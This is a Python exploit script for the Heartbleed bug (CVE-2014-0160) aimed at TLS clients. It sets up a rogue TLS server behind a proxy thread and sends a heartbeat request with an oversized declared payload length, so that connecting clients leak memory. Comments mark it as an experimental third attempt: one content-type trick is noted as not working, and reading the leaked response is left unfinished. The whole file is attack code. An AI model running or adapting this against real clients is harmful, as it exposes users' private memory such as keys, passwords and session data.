#!/usr/bin/env python
# Exploitation of CVE-2014-0160 Heartbeat for the client (attempt 3: proxy the
# data in attempt to modify the content type).
# Author: Peter Wu <peter@lekensteyn.nl>

import socket
import socketserver
import sys
import struct
import ssl
import threading
import select

BUFSIZE = 4096

record_struct = struct.Struct('>BHH')

class ClientWrapper(threading.Thread):
    def __init__(self, csock):
        threading.Thread.__init__(self, name=__name__)
        self.real_csock = csock
        self.fake_ssock, self.fake_csock = socket.socketpair()

    def run_proxy(self):
        while True:
            # Wait until one of the FDs has data to read
            rlist = (self.real_csock, self.fake_ssock)
            ready_fds, _, _ = select.select(rlist, (), rlist)
            for fd in ready_fds:
                data = fd.recv(BUFSIZE)
                if not data:
                    print("Dead connection:", str(fd), file=sys.stderr)
                    return
                if fd == self.real_csock:
                    self.fake_ssock.sendall(data)
                elif fd == self.fake_ssock:
                    self.handle_data_from_server(data)
                else:
                    raise RuntimeError("Unexpected fd:", str(fd))

    def run(self):
        self.handshake_done = False
        self.sbuffer = bytearray()
        self.run_proxy()

    def handle_data_from_server(self, data):
        sbuffer = self.sbuffer
        self.sbuffer += data
        while len(sbuffer) >= record_struct.size:
            rtype, ver, rlen = record_struct.unpack_from(sbuffer)
            blocklen = record_struct.size + rlen
            if len(sbuffer) < blocklen:
                break # Data is too small

            # DOES NOT WORK, type is protected by MAC
            #if rtype == 23: # Application Data
            #    self.sbuffer[0] = 24 # Heartbeat

            self.real_csock.sendall(sbuffer[0:blocklen])
            del self.sbuffer[0:blocklen]

class TCPSvr(socketserver.BaseRequestHandler):
    def mitm(self, csock):
        cw = ClientWrapper(csock)
        cw.start()
        return cw.fake_csock

    def handle(self):
        scon = ssl.wrap_socket(self.mitm(self.request),
            keyfile='server.key',
            certfile='server.crt',
            server_side=True)

        # Type (1 octet), Payload Length (2 octets), (others are ignored)
        scon.sendall(b'\x01\40\00')
        # TODO read full response
        scon.recv(1)

def serve(port):
    addr = ('', port)
    server = socketserver.TCPServer(addr, TCPSvr)
    server.serve_forever()

if __name__ == '__main__':
    serve(int(sys.argv[1]))
